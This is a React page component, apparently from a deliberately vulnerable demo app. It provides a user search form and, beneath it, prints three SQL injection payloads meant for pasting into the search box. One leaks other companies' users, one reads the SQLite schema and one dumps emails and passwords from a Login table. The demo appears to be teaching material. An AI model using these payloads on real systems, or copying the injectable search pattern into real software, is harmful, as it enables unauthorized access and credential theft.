import React, { useEffect, useState } from "react";
import BaseTemplate from "../templates/BaseTemplate";
import { makeStyles } from "@material-ui/core/styles";
import Table from "@material-ui/core/Table";
import TableBody from "@material-ui/core/TableBody";
import TableCell from "@material-ui/core/TableCell";
import TableContainer from "@material-ui/core/TableContainer";
import TableHead from "@material-ui/core/TableHead";
import TableRow from "@material-ui/core/TableRow";
import Paper from "@material-ui/core/Paper";
import { Button, TextField } from "@material-ui/core";
import { User } from "../../api/@type/User";
import { Controller, useForm } from "react-hook-form";
import { getUsers, searchRiskyUsers } from "../../api/client/Users";

const useStyles = makeStyles({
  table: {
    minWidth: 650,
  },
});

const UserSecurityHolePage: React.FC = () => {
  const classes = useStyles();
  const [users, setUsers] = useState<User[]>();
  const { handleSubmit, control } = useForm();

  // test client
  const clientId = 1;

  useEffect(() => {
    getUsers(clientId).then((u) => setUsers(u));
  }, []);

  const onSubmit = (data: any) => {
    searchRiskyUsers(clientId, data.searchTextField).then((u) => setUsers(u));
  };

  return (
    <BaseTemplate title="User Security Hole">
      <form onSubmit={handleSubmit(onSubmit)}>
        <Controller
          name="searchTextField"
          control={control}
          rules={{ required: true }}
          render={({ field }) => (
            <TextField
              {...field}
              InputLabelProps={{
                shrink: true,
              }}
              style={{
                margin: "10px",
                width: "300px",
              }}
              placeholder="Please enter user's name"
            />
          )}
        />
        <Button
          variant="contained"
          type="submit"
          color="primary"
          style={{
            margin: "10px",
          }}
        >
          Search
        </Button>
      </form>
      <TableContainer component={Paper}>
        <Table className={classes.table} aria-label="simple table">
          <TableHead>
            <TableRow>
              <TableCell>Company Name</TableCell>
              <TableCell>First Name</TableCell>
              <TableCell>Last Name</TableCell>
              <TableCell>Age</TableCell>
            </TableRow>
          </TableHead>
          <TableBody>
            {users &&
              users.map((u) => (
                <TableRow key={u.id}>
                  <TableCell component="th" scope="row">
                    {u.client?.companyName}
                  </TableCell>
                  <TableCell>{u.firstName}</TableCell>
                  <TableCell>{u.lastName}</TableCell>
                  <TableCell>{u.age}</TableCell>
                </TableRow>
              ))}
          </TableBody>
        </Table>
      </TableContainer>
      <h3>
        Please copy and past the below SQL if you want to get users of the other
        companies
      </h3>
      <p>%' ) OR 1=1 --</p>
      <h3>
        Please copy and past the below SQL if you want to check table schemas
      </h3>
      <p>
        %' ) OR 1=1 UNION SELECT 1 as id, sql as firstName, 'fakelastname' as
        lastName, 1 as age, 1 as clientId, datetime('now') as createdDateTime,
        datetime('now') as updatedDateTime, 'fakeName' as clientCompanyName,
        datetime('now') as clientCreatedDateTime, datetime('now') as
        clientUpdatedDateTime FROM sqlite_master; --
      </p>
      <h3>
        Please copy and past the below SQL if you want to get all user's ids and
        passwords
      </h3>
      <p>
        %' ) OR 1=1 UNION SELECT userId as id, email as firstName, password as
        lastName, 1 as age, 1 as clientId, datetime('now') as createdDateTime,
        datetime('now') as updatedDateTime, 'fakeName' as clientCompanyName,
        datetime('now') as clientCreatedDateTime, datetime('now') as
        clientUpdatedDateTime FROM Login; --
      </p>
    </BaseTemplate>
  );
};

export default UserSecurityHolePage;
